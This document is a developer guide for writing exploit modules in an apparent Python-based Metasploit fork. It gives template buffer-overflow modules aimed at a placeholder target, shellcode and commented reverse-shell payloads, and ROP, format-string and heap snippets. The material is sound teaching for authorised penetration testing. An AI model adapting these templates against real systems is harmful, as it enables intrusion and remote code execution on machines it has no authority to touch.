# Exploit Writing Guide

## Introduction

This guide provides comprehensive documentation for writing high-quality exploitation modules for Metasploit Framework, with a focus on integration with modern tooling and best practices.

Metasploit has traditionally been a Ruby-based framework, but this fork embraces Python and modern binary analysis tools. You can write exploits in either language and leverage powerful libraries like pwntools, radare2, ghidra, and more.

## Philosophy

Good exploits are:
- **Reliable**: They work consistently on target systems
- **Well-documented**: Users understand what they do and how to use them
- **Educational**: Code is clear and teaches exploitation concepts
- **Modern**: Use current tools and techniques
- **Maintainable**: Easy to update as systems change

## Getting Started

### Prerequisites

Before writing exploits, you should understand:
- The vulnerability you're exploiting
- The target system architecture
- Memory corruption techniques (if applicable)
- Python or Ruby programming
- Network protocols (for remote exploits)

### Tools You Should Know

- **pwntools**: Python library for exploit development
- **radare2**: Reverse engineering framework
- **gdb**: GNU debugger with pwndbg/gef
- **ghidra**: NSA's reverse engineering tool
- **AFL++/libFuzzer**: Coverage-guided fuzzers
- **ROPgadget**: ROP chain generation

## Module Structure

### Basic Ruby Exploit

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient  # If HTTP-based

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Target Software Buffer Overflow',
        'Description' => %q{
          This module exploits a buffer overflow vulnerability in Target Software
          version X.Y.Z. The vulnerability exists in the foo() function when
          processing bar requests, allowing arbitrary code execution.
        },
        'Author' => [
          'Original Researcher',  # Vulnerability discovery
          'Your Name <your@email.com>'  # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-XXXXX'],
          ['URL', 'https://advisory-url.com'],
          ['EDB', '12345']  # Exploit-DB ID if applicable
        ],
        'Platform' => 'win',  # or 'linux', 'unix', etc.
        'Arch' => ARCH_X86,  # or ARCH_X64, etc.
        'Targets' => [
          [
            'Windows 10 x64',
            {
              'Offset' => 256,
              'Ret' => 0x10001000  # Return address
            }
          ]
        ],
        'Payload' => {
          'Space' => 400,
          'BadChars' => "\x00\x0a\x0d",
          'DisableNops' => false
        },
        'DefaultTarget' => 0,
        'DisclosureDate' => '2024-01-01',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(9999)
    ])
  end

  def check
    # Implement version detection
    connect
    sock.put("VERSION\r\n")
    res = sock.get_once
    disconnect

    if res && res =~ /Target Software (\d+\.\d+\.\d+)/
      version = ::Rex::Version.new($1)
      if version <= ::Rex::Version.new('1.2.3')
        return Exploit::CheckCode::Appears
      end
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    connect

    # Build exploit buffer
    buffer = make_exploit_buffer

    print_status("Sending exploit to #{rhost}:#{rport}...")
    sock.put(buffer)

    handler
    disconnect
  end

  def make_exploit_buffer
    buffer = ''
    buffer << 'A' * target['Offset']
    buffer << [target['Ret']].pack('V')  # Little-endian return address
    buffer << payload.encoded
    buffer
  end
end
```

### Basic Python Exploit

```python
#!/usr/bin/env python3
"""
This module exploits a buffer overflow vulnerability in Target Software
"""

from pwn import *
import struct

class MetasploitModule:
    def __init__(self):
        self.module_info = {
            'Name': 'Target Software Buffer Overflow',
            'Description': '''
                This module exploits a buffer overflow vulnerability in Target Software
                version X.Y.Z. The vulnerability exists in the foo() function when
                processing bar requests, allowing arbitrary code execution.
            ''',
            'Author': [
                'Original Researcher',
                'Your Name <your@email.com>'
            ],
            'License': 'MSF_LICENSE',
            'References': [
                ['CVE', '2024-XXXXX'],
                ['URL', 'https://advisory-url.com']
            ],
            'Platform': 'linux',
            'Arch': 'x86_64',
            'Targets': [
                {
                    'name': 'Ubuntu 22.04 x64',
                    'offset': 256,
                    'ret_addr': 0x7fffffffe000
                }
            ],
            'Payload': {
                'space': 400,
                'bad_chars': b'\x00\x0a\x0d'
            },
            'DefaultTarget': 0,
            'DisclosureDate': '2024-01-01',
            'Notes': {
                'Stability': ['CRASH_SAFE'],
                'Reliability': ['REPEATABLE_SESSION'],
                'SideEffects': ['IOC_IN_LOGS']
            }
        }
        
        self.options = {
            'RHOST': {'type': 'address', 'default': '127.0.0.1', 'required': True},
            'RPORT': {'type': 'port', 'default': 9999, 'required': True},
            'LHOST': {'type': 'address', 'required': True},
            'LPORT': {'type': 'port', 'default': 4444, 'required': True}
        }

    def check(self, rhost, rport):
        """Check if target is vulnerable"""
        try:
            r = remote(rhost, rport)
            r.send(b'VERSION\n')
            version = r.recv(1024)
            r.close()
            
            # Parse version and check vulnerability
            if b'Target Software 1.2.3' in version:
                return 'APPEARS_VULNERABLE'
        except:
            return 'UNKNOWN'
        
        return 'SAFE'

    def exploit(self, rhost, rport, lhost, lport, target_idx=0):
        """Run the exploit"""
        target = self.module_info['Targets'][target_idx]
        
        print(f"[*] Exploiting {rhost}:{rport}")
        print(f"[*] Target: {target['name']}")
        
        # Generate payload
        payload = self.generate_payload(lhost, lport)
        
        # Build exploit buffer
        buffer = self.build_exploit_buffer(target, payload)
        
        # Send exploit
        r = remote(rhost, rport)
        r.send(buffer)
        
        print(f"[*] Exploit sent, check listener on {lhost}:{lport}")
        
        # Return shell or session info
        return {'success': True, 'session_info': f"{lhost}:{lport}"}

    def build_exploit_buffer(self, target, payload):
        """Construct exploit buffer"""
        buffer = b'A' * target['offset']
        buffer += struct.pack('<Q', target['ret_addr'])  # Little-endian 64-bit
        buffer += payload
        return buffer

    def generate_payload(self, lhost, lport):
        """Generate shellcode payload"""
        # Use pwntools to generate shellcode
        shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64')
        
        # Or generate reverse shell
        # shellcode = asm(shellcraft.amd64.linux.connect(lhost, lport) +
        #                 shellcraft.amd64.linux.dupsh(), arch='amd64')
        
        return shellcode


if __name__ == '__main__':
    import sys
    
    module = MetasploitModule()
    
    if len(sys.argv) < 3:
        print("Usage: python exploit.py <RHOST> <RPORT> [LHOST] [LPORT]")
        sys.exit(1)
    
    rhost = sys.argv[1]
    rport = int(sys.argv[2])
    lhost = sys.argv[3] if len(sys.argv) > 3 else '127.0.0.1'
    lport = int(sys.argv[4]) if len(sys.argv) > 4 else 4444
    
    # Check vulnerability
    status = module.check(rhost, rport)
    print(f"[*] Check result: {status}")
    
    if status in ['APPEARS_VULNERABLE', 'VULNERABLE']:
        # Run exploit
        result = module.exploit(rhost, rport, lhost, lport)
        print(f"[+] Exploit result: {result}")
```

## Advanced Topics

### Using Pwntools for ROP

```python
from pwn import *

def build_rop_chain(binary_path, libc_path=None):
    """Build a ROP chain using pwntools"""
    
    # Load binary
    elf = ELF(binary_path)
    rop = ROP(elf)
    
    # Find gadgets
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    
    # Build chain
    chain = b''
    chain += p64(pop_rdi)
    chain += p64(elf.got['puts'])
    chain += p64(elf.plt['puts'])
    chain += p64(elf.symbols['main'])
    
    return chain

# Use in exploit
rop_chain = build_rop_chain('/path/to/binary')
buffer = b'A' * offset + rop_chain
```

### Using Radare2 for Analysis

```python
import r2pipe

def find_gadgets(binary_path):
    """Use radare2 to find ROP gadgets"""
    
    r2 = r2pipe.open(binary_path)
    r2.cmd('aaa')  # Analyze all
    
    # Find ROP gadgets
    gadgets = r2.cmd('/R pop rdi')
    
    # Find functions
    functions = r2.cmdj('aflj')  # JSON output
    
    r2.quit()
    
    return gadgets, functions
```

### Heap Exploitation

```python
from pwn import *

def heap_exploit_example():
    """Example of heap exploitation technique"""
    
    # Create fake chunks
    fake_chunk = flat({
        0x00: 0x0,           # prev_size
        0x08: 0x21,          # size (with flags)
        0x10: 0x41414141,    # fd
        0x18: 0x42424242     # bk
    })
    
    # Use after free scenario
    # 1. Allocate chunks
    # 2. Free them in specific order
    # 3. Overflow to corrupt metadata
    # 4. Trigger allocation to get arbitrary write
    
    return fake_chunk
```

### Format String Exploitation

```python
def format_string_exploit(binary, offset):
    """Exploit format string vulnerability"""
    
    # Calculate offset to format string
    # payload = f"%{offset}$p"  # Leak value at offset
    
    # Arbitrary write
    target_addr = 0x08049000
    write_value = 0x41414141
    
    payload = fmtstr_payload(offset, {target_addr: write_value})
    
    return payload
```

## Integration with Modern Tools

### AFL++ Integration

```python
def setup_afl_fuzzing(binary_path, input_dir, output_dir):
    """Setup AFL++ fuzzing for the target"""
    
    import subprocess
    
    # Compile with AFL instrumentation
    subprocess.run([
        'afl-clang-fast', 
        '-o', 'target_afl',
        'target.c'
    ])
    
    # Run AFL++
    subprocess.run([
        'afl-fuzz',
        '-i', input_dir,
        '-o', output_dir,
        '--', './target_afl', '@@'
    ])
```

### GDB Automation

```python
def gdb_exploit_dev(binary_path, payload):
    """Use GDB with pwntools for exploit development"""
    
    # Start process with GDB
    io = gdb.debug(binary_path, '''
        break vulnerable_function
        continue
    ''')
    
    # Send payload
    io.sendline(payload)
    
    # Interact
    io.interactive()
```

### Ghidra Integration

```python
def analyze_with_ghidra(binary_path):
    """Use Ghidra for static analysis"""
    
    # This would integrate with Ghidra's headless analyzer
    # or use ghidra_bridge for scripting
    
    import ghidra_bridge
    
    with ghidra_bridge.GhidraBridge(namespace=globals()):
        # Access Ghidra API
        currentProgram = getCurrentProgram()
        functions = currentProgram.getFunctionManager().getFunctions(True)
        
        for func in functions:
            print(f"Function: {func.getName()}")
```

## Best Practices

### 1. Always Include Check Method

Implement a `check()` method that detects if the target is vulnerable without exploitation.

```ruby
def check
  res = send_request_cgi({
    'uri' => normalize_uri(target_uri.path, 'version.php')
  })
  
  if res && res.body =~ /Version: (\d+\.\d+\.\d+)/
    version = ::Rex::Version.new($1)
    if version <= ::Rex::Version.new('1.2.3')
      return Exploit::CheckCode::Appears
    end
  end
  
  Exploit::CheckCode::Safe
end
```

### 2. Handle Errors Gracefully

```python
def exploit(self, rhost, rport):
    try:
        r = remote(rhost, rport)
        r.send(payload)
    except ConnectionRefusedError:
        print("[-] Connection refused - target may be down")
        return False
    except TimeoutError:
        print("[-] Connection timeout")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False
    finally:
        if 'r' in locals():
            r.close()
```

### 3. Document Thoroughly

Include in module documentation:
- Vulnerability details
- Target setup instructions
- Expected output
- Troubleshooting tips
- References to CVEs and advisories

### 4. Test on Multiple Targets

If possible, test on:
- Different versions of the target software
- Different OS versions
- Different architectures
- Different configurations

### 5. Use Existing Framework Features

Don't reinvent the wheel:
- Use `Msf::Exploit::Remote::HttpClient` for HTTP
- Use `Msf::Exploit::Remote::Tcp` for raw sockets
- Use framework's payload generation
- Use framework's encoding capabilities

## Common Pitfalls

### 1. Hardcoded Addresses

❌ Bad:
```python
ret_addr = 0x7fffffffe000  # Will vary between systems
```

✅ Good:
```python
# Calculate address dynamically or support multiple targets
targets = [
    {'os': 'Ubuntu 22.04', 'ret_addr': 0x7fffffffe000},
    {'os': 'Ubuntu 20.04', 'ret_addr': 0x7fffffffd000}
]
```

### 2. No Error Handling

❌ Bad:
```python
r = remote(rhost, rport)
r.send(payload)
```

✅ Good:
```python
try:
    r = remote(rhost, rport, timeout=10)
    r.send(payload)
except Exception as e:
    print(f"[-] Error: {e}")
    return False
```

### 3. Missing BadChars

❌ Bad:
```ruby
payload.encoded  # May contain bad characters
```

✅ Good:
```ruby
'Payload' => {
  'BadChars' => "\x00\x0a\x0d\x20"
}
```

### 4. No Target Validation

Always validate that the target matches expectations before exploitation.

## Example: Complete Exploit with Modern Tools

See `examples/complete_exploit_example.py` for a full example that demonstrates:
- Target analysis with radare2
- ROP chain generation with pwntools
- Heap exploitation techniques
- Integration with GDB for debugging
- Proper error handling and logging

## Resources

### Essential Reading
- "The Shellcoder's Handbook" - Detailed exploitation techniques
- "Hacking: The Art of Exploitation" - Foundational concepts
- "A Guide to Kernel Exploitation" - Advanced topics

### Tools Documentation
- [Pwntools Documentation](https://docs.pwntools.com/)
- [Radare2 Book](https://book.rada.re/)
- [GEF Documentation](https://hugsy.github.io/gef/)
- [AFL++ Documentation](https://aflplus.plus/)

### Metasploit Resources
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Metasploit Development](https://docs.metasploit.com/docs/development/)
- [Module Reference](https://docs.metasploit.com/docs/using-metasploit/basics/module-documentation.html)

## Contributing Your Exploits

When submitting exploits:
1. Follow this guide's structure and practices
2. Include comprehensive documentation
3. Test thoroughly on multiple targets
4. Include setup instructions for vulnerable environments
5. Provide sample output and verification steps
6. Reference CVEs and original research

See [CONTRIBUTING.md](../CONTRIBUTING.md) for full contribution guidelines.
